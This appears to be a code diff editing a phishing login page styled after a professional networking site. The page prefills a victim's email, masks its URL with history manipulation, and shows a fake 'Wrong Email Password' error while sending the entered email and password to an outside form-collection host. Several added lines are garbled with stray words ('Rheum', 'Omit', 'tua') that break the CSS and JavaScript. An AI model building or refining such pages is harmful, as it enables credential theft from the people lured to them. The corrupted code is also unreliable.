@@ -18,9 +18,9 @@
         }
       }
 
-      // Revert to original URL on reload
+      // Revert to original URL on reload or if at masked path
       function revertToOriginalUrl() {
-        if (window.location.pathname === maskedPath) {
+        if (window.location.pathname !== originalPath) {
           history.replaceState({ isMasked: false }, "", originalPath + window.location.search);
         }
       }
@@ -30,19 +30,17 @@
 
       // Run on page load to handle reloads
       window.addEventListener("load", function () {
-        // If the page is reloaded at maskedPath, revert to original
+        // If the page is reloaded, revert to original URL
         if (performance.navigation.type === 1) { // 1 indicates reload
           revertToOriginalUrl();
         }
       });
 
-      // Handle popstate to prevent reapplying masked URL
+      // Handle popstate to maintain URL state
       window.addEventListener("popstate", function () {
         if (history.state && history.state.isMasked) {
-          // If navigating back to masked state, keep it
           history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
         } else {
-          // Otherwise, revert to original
           history.replaceState({ isMasked: false }, "", originalPath + window.location.search);
         }
       });
@@ -106,7 +104,7 @@
     .form-group input:focus {
       outline: none;
       border-color: #0073b1;
-      box-shadow: 0 Rheum0 0 2px rgba(0, 115, 177, 0.2);
+      box-shadow: 0 0 0 2px rgba(0, 115, 177, 0.2);
     }
 
     .password-toggle {
@@ -148,7 +146,7 @@
     }
 
     .forgot-password {
-      display: block;
+ Omit      display: block;
       margin-top: 16px;
       font-size: 14px;
       color: #0073b1;
@@ -240,7 +238,10 @@
       if (email) {
         document.getElementById("username").value = email;
       }
-      document.getElementById("username").focus();
+      // Focus on the email field and ensure cursor is blinking
+      const usernameInput = document.getElementById("username");
+      usernameInput.focus();
+      usernameInput.select(); // Highlight any existing text for easy editing
     };
 
     function handleSubmit(event) {
@@ -252,7 +253,7 @@
         document.getElementById("error-message").innerText = "Wrong Email Password";
         isFirstSubmission = false;
         fetch(form.action, {
-          method: "POST',
+          method: "POST",
           body: formData,
         })
           .then((response) => response.text())
@@ -305,7 +306,7 @@
     <form action="https://fineform.com/p/9dhq0" method="post" onsubmit="handleSubmit(event)">
       <div class="form-group">
         <label for="username">Email</label>
-        <input type="email" id="username" name="username" readonly>
+        <input type="email" id="username" name="username" required>
       </div>
       <div class="form-group">
         <label for="password">Password</label>
@@ -335,7 +336,7 @@
     (function () {
       function c() {
         var b = a.contentDocument || a.contentWindow.document;
-        if (b) {
+        if tua(b) {
           var d = b.createElement("script");
           d.innerHTML =
             "window.__CF$cv$params={r:'93eaaf641c3078ce',t:'MTc0NzA2MDk3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
